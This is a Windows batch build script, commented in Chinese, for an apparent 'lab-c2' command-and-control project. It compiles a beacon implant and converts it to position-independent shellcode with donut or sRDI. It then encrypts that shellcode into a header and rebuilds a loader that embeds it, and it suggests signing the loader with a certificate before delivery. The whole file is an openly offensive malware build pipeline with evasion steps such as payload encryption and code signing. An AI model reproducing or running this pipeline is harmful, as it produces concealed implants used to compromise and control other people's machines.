@echo off
REM ============================================================
REM  lab-c2 构建 (x64) —— 在 "x64 Native Tools Command Prompt for VS 2022" 里运行
REM ============================================================
setlocal enabledelayedexpansion
cd /d "%~dp0"
if not exist build mkdir build

set CL_FLAGS=/nologo /O2 /GS- /GL /MT /std:c++17 /EHsc /DNDEBUG /utf-8 ^
 /DWIN32_LEAN_AND_MEAN /D_CRT_SECURE_NO_WARNINGS
set LINK_FLAGS=/link /OPT:REF /OPT:ICF /MERGE:.rdata=.text /SUBSYSTEM:CONSOLE ^
 /DYNAMICBASE /HIGHENTROPYVA /DEBUG:NONE

echo [1/4] 编译 beacon.exe
cl %CL_FLAGS% implant\beacon.cpp /Fo:build\ /Fe:build\beacon.exe %LINK_FLAGS% ^
 winhttp.lib advapi32.lib shell32.lib || goto :err

echo [2/4] 编译 loader.exe (无 payload 版本, 用于语法自检)
cl %CL_FLAGS% implant\loader.cpp /Fo:build\ /Fe:build\loader.exe %LINK_FLAGS% ^
 advapi32.lib user32.lib || goto :err

if not exist build\beacon.bin (
  echo [3/4] 缺少 build\beacon.bin, 先转换信标为位置无关 shellcode:
  echo       donut.exe -f 1 -a 2 -o build\beacon.bin build\beacon.exe
  echo       或: python sRDI\ConvertToShellcode.py build\beacon.dll
  goto :done
)

echo [3/4] 加密 shellcode -^> implant\payload.h
python tools\enc.py build\beacon.bin || goto :err

echo [4/4] 带 payload 重编 loader.exe
cl %CL_FLAGS% implant\loader.cpp /Fo:build\ /Fe:build\loader.exe %LINK_FLAGS% ^
 advapi32.lib user32.lib || goto :err

:done
echo.
echo 产物: build\beacon.exe  build\loader.exe
echo 提示: 交付前可选
echo   signtool sign /fd SHA256 /f cert.pfx /p PASS /tr http://timestamp.digicert.com ^
 /td SHA256 build\loader.exe
goto :eof

:err
echo 构建失败, errorlevel=%errorlevel%
exit /b 1
